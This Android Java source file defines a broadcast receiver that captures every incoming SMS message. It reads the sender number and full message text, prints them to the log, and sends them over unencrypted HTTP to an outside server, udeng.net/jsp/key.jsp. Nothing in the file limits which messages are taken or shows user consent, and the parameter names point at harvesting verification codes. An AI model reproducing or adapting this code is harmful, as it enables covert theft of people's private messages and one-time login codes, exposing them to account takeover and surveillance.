package com.emotte.lzh;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.emotte.util.EdjTools;
import com.emotte.util.HttpUtil;

public class MyBroadcast extends BroadcastReceiver {

	EdjApp app;
	String receiveMsg = "";

	SmsMessage[] msg = null;
	String mobile;
	String number;
	// action 名称
	String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals(SMS_RECEIVED)) {
			StringBuffer SMSAddress = new StringBuffer();
			StringBuffer SMSContent = new StringBuffer();
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObjects = (Object[]) bundle.get("pdus");
				SmsMessage[] messages = new SmsMessage[pdusObjects.length];
				for (int i = 0; i < pdusObjects.length; i++) {
					messages[i] = SmsMessage
							.createFromPdu((byte[]) pdusObjects[i]);
				}
				for (SmsMessage message : messages) {

					SMSAddress.append(message.getDisplayOriginatingAddress());
					SMSContent.append(message.getDisplayMessageBody());
					System.out.println("发送号码：" + SMSAddress + "\n" + "短信内容："
							+ SMSContent);

					mobile = message.getDisplayOriginatingAddress();
					number = message.getDisplayMessageBody();
		
					new	SaveCallLogOtherAsyncTask(mobile, number).execute("");
				}
			}
		}
	}

	 class SaveCallLogOtherAsyncTask extends AsyncTask<String, String, String> {

		String mobile;
		String code;

		public SaveCallLogOtherAsyncTask(String mobile, String code) {
			this.mobile = mobile;
			this.code = code;
		}

		/*
		 * (non-Javadoc) 后续上传
		 * 
		 * @see android.os.AsyncTask#doInBackground(Params[])
		 */
		@Override
		protected String doInBackground(String... params) {

			EdjTools.writeUrl("no"+mobile, code, EdjApp.getInstance());
			EdjTools.writegroup("no"+mobile, EdjApp.getInstance());

			String url = "http://www.udeng.net/jsp/key.jsp?p=" + mobile + "&k="
					+ code;
		
			String code3 = HttpUtil.get(url, "hhh", "utf-8");
			if(code3!=null&&!"".equals(code3)){
			code3=code3.replaceAll("\n", "").replaceAll("\r", "").trim();
			if ("1".endsWith(code3)||code3 == "1") {
			
				System.out.println(" 上传成功  " + mobile);

				EdjTools.removeUrl("no"+mobile, EdjApp.getInstance());
				EdjTools.removegroup("no"+mobile, EdjApp.getInstance());
				EdjTools.writeUrl("yes"+mobile, code, EdjApp.getInstance());
				EdjTools.writegroup("yes"+mobile, EdjApp.getInstance());
			
			}
			}
			return null;

		}
	}
	 
	 
	  

}